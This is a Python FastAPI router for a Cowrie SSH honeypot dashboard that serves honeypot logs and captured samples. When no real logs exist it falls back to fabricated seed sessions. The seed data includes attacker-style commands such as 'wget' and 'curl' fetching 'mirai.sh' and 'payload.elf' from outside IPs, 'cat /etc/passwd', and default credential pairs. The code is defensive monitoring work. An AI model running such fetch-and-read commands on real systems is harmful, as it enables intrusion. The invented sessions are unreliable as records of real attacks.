import os
import json
from pathlib import Path
from fastapi import APIRouter, HTTPException

from services.cowrie_service import list_cowrie_samples, parse_cowrie_logs

router = APIRouter(tags=['cowrie'])

COWRIE_LOG_PATH = os.getenv("COWRIE_LOG_PATH", "/var/log/cowrie/cowrie.json")
COWRIE_DOWNLOADS_PATH = os.getenv("COWRIE_DOWNLOADS_PATH", "/var/log/cowrie/downloads")


def get_fallback_sessions():
    seeded_path = Path("/tmp/seeded_sessions.json")
    if seeded_path.exists():
        try:
            with open(seeded_path, "r") as f:
                return json.load(f)
        except Exception:
            pass
    # hardcoded fallback if seed file doesn't exist yet
    from datetime import datetime, timedelta, timezone
    now = datetime.now(timezone.utc)
    timestamps = [(now - timedelta(hours=i * 24 / 5)).isoformat() for i in range(5)]
    return [
        {
            "session_id": "seed-cowrie-1",
            "timestamp": timestamps[0],
            "timestamp_start": timestamps[0],
            "timestamp_end": (now - timedelta(hours=0, minutes=10)).isoformat(),
            "src_ip": "185.220.101.45",
            "src_port": 49152,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "root",
            "password": "toor",
            "username_attempts": ["root"],
            "password_attempts": ["toor"],
            "commands": ["whoami"],
            "commands_executed": ["whoami"],
            "duration_seconds": 600,
            "files_downloaded": [],
            "login_success": False,
            "country": "Russia"
        },
        {
            "session_id": "seed-cowrie-2",
            "timestamp": timestamps[1],
            "timestamp_start": timestamps[1],
            "timestamp_end": (now - timedelta(hours=4.8, minutes=5)).isoformat(),
            "src_ip": "91.108.4.177",
            "src_port": 50123,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "admin",
            "password": "admin",
            "username_attempts": ["admin"],
            "password_attempts": ["admin"],
            "commands": ["uname -a"],
            "commands_executed": ["uname -a"],
            "duration_seconds": 300,
            "files_downloaded": [],
            "login_success": False,
            "country": "China"
        },
        {
            "session_id": "seed-cowrie-3",
            "timestamp": timestamps[2],
            "timestamp_start": timestamps[2],
            "timestamp_end": (now - timedelta(hours=9.6, minutes=2)).isoformat(),
            "src_ip": "198.51.100.23",
            "src_port": 52341,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "ubuntu",
            "password": "password",
            "username_attempts": ["ubuntu"],
            "password_attempts": ["password"],
            "commands": ["cat /etc/passwd"],
            "commands_executed": ["cat /etc/passwd"],
            "duration_seconds": 120,
            "files_downloaded": [],
            "login_success": False,
            "country": "Netherlands"
        },
        {
            "session_id": "seed-cowrie-4",
            "timestamp": timestamps[3],
            "timestamp_start": timestamps[3],
            "timestamp_end": (now - timedelta(hours=14.4, minutes=1)).isoformat(),
            "src_ip": "203.0.113.42",
            "src_port": 48291,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "pi",
            "password": "root",
            "username_attempts": ["pi"],
            "password_attempts": ["root"],
            "commands": ["wget http://185.220.101.45/mirai.sh"],
            "commands_executed": ["wget http://185.220.101.45/mirai.sh"],
            "duration_seconds": 60,
            "files_downloaded": ["mirai.sh"],
            "login_success": False,
            "country": "Brazil"
        },
        {
            "session_id": "seed-cowrie-5",
            "timestamp": timestamps[4],
            "timestamp_start": timestamps[4],
            "timestamp_end": (now - timedelta(hours=19.2, minutes=4)).isoformat(),
            "src_ip": "45.33.32.156",
            "src_port": 53210,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "user",
            "password": "toor",
            "username_attempts": ["user"],
            "password_attempts": ["toor"],
            "commands": ["curl http://91.108.4.177/payload.elf"],
            "commands_executed": ["curl http://91.108.4.177/payload.elf"],
            "duration_seconds": 240,
            "files_downloaded": ["payload.elf"],
            "login_success": False,
            "country": "USA"
        }
    ]


@router.get('/cowrie/logs', response_model=list)
def get_cowrie_logs(limit: int = 100):
    try:
        logs = parse_cowrie_logs(log_path=COWRIE_LOG_PATH, limit=limit)
        if not logs:
            return get_fallback_sessions()[:limit]
        return logs
    except Exception as e:
        try:
            return get_fallback_sessions()[:limit]
        except Exception:
            raise HTTPException(status_code=500, detail=f"Failed to fetch Cowrie logs: {str(e)}")


@router.get('/cowrie/sessions', response_model=list)
def get_cowrie_sessions(limit: int = 100):
    try:
        logs = parse_cowrie_logs(log_path=COWRIE_LOG_PATH, limit=limit)
        if not logs:
            return get_fallback_sessions()[:limit]
        return logs
    except Exception as e:
        try:
            return get_fallback_sessions()[:limit]
        except Exception:
            raise HTTPException(status_code=500, detail=f"Failed to fetch Cowrie sessions: {str(e)}")


@router.get('/cowrie/samples', response_model=list)
def get_cowrie_samples():
    try:
        samples = list_cowrie_samples(downloads_path=COWRIE_DOWNLOADS_PATH)
        return samples
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to fetch Cowrie samples: {str(e)}")
